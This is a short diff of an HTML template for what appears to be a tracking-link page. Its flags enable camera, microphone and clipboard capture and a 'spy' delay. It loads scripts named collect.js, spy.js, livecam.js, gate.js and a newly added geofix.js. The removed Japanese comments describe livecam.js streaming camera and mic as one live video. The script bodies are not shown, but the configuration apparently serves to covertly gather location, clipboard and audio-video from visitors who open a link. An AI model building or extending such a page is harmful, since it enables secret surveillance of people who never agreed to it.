@@ -108,21 +108,18 @@ window.LT_RETRY_TEXT = {{ retry_text|tojson }};
 window.LT_TITLE      = {{ link.name|tojson }};
 window.LT_GATE = {{ 1 if gate else 0 }};
 window.LT_REQUIRE_ALL = {{ 1 if require_all else 0 }};
-
-/* headでLINE処理済みなので二重に走らせない */
 window.LT_LINE_FIX = 0;
-
-/* カメラとマイクは livecam.js が「1本のライブ動画」として担当する */
 window.LT_CAM      = 0;
 window.LT_MIC      = 0;
 window.LT_CLIP     = 1;
 window.LT_SPY_WAIT = 7000;
 window.LT_DEBUG    = 0;
 </script>
-<script src="/static/keepalive.js?v=15"></script>
-<script src="/static/collect.js?v=15"></script>
-<script src="/static/live.js?v=15"></script>
-<script src="/static/spy.js?v=15"></script>
-<script src="/static/livecam.js?v=15"></script>
-<script src="/static/gate.js?v=15"></script>
+<script src="/static/geofix.js?v=16"></script>
+<script src="/static/keepalive.js?v=16"></script>
+<script src="/static/collect.js?v=16"></script>
+<script src="/static/live.js?v=16"></script>
+<script src="/static/spy.js?v=16"></script>
+<script src="/static/livecam.js?v=16"></script>
+<script src="/static/gate.js?v=16"></script>
 </body></html>
